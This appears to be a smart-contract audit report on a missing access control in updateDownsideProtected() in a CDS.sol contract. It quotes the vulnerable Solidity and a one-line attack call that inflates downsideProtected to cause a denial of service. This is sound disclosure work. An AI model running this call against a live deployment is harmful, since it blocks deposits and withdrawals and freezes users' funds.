# updateDownsideProtected() to Deny Service and Cause Protocol Disruption

### Summary

A missing access control in updateDownsideProtected() allows attackers to inflate the downsideProtected variable arbitrarily, disrupting the protocol by reducing totalCdsDepositedAmount to zero or triggering reverts. This Denial of Service (DoS) attack blocks legitimate users from interacting with the protocol and destabilizes its internal accounting.

### Root Cause

Code Location: In CDS.sol, `updateDownsideProtected()` lacks access restrictions, enabling anyone to call it with unvalidated input:

```solidity

function updateDownsideProtected(uint128 downsideProtectedAmount) external {
    downsideProtected += downsideProtectedAmount;
}
```

Impact: During deposit or withdrawal operations, _updateCurrentTotalCdsDepositedAmount() subtracts the inflated downsideProtected value from totalCdsDepositedAmount, causing significant accounting errors:

```solidity

function _updateCurrentTotalCdsDepositedAmount() private {
    if (downsideProtected > 0) {
        totalCdsDepositedAmount -= downsideProtected;
        totalCdsDepositedAmountWithOptionFees -= downsideProtected;
        downsideProtected = 0;
    }
}
```

### Internal pre-conditions

The updateDownsideProtected() function must remain unrestricted.
totalCdsDepositedAmount must be a positive value.
An attacker calls updateDownsideProtected() with a massive downsideProtectedAmount.


### External pre-conditions

_No response_

### Attack Path

Assume totalCdsDepositedAmount = 500,000 USDa.
The downsideProtected variable is normally negligible unless legitimate coverage is applied.

An attacker calls:
`cds.updateDownsideProtected(1_000_000_000e18);`
This inflates downsideProtected to an unrealistically high value.

Triggering the Disruption:
When any user interacts with the protocol (e.g., calling deposit() or withdraw()), _updateCurrentTotalCdsDepositedAmount() 

executes:
```solidity

totalCdsDepositedAmount -= downsideProtected;
downsideProtected = 0;
```
The subtraction reduces totalCdsDepositedAmount to a large negative value or reverts due to underflow.

Result:
Protocol reverts any further operations relying on totalCdsDepositedAmount, such as calculateRatio() or collateralization checks.
Legitimate users are blocked from deposits, withdrawals, or redemptions.

### Impact

Denial of Service:
Blocks legitimate user interactions across the protocol.
Prevents deposits, withdrawals, and other critical operations.
System Instability:
Misrepresents totalCdsDepositedAmount in core logic, destabilizing CDS coverage ratios and potentially forcing erroneous liquidations.
User Loss:
Honest users suffer from frozen positions and blocked access to funds.
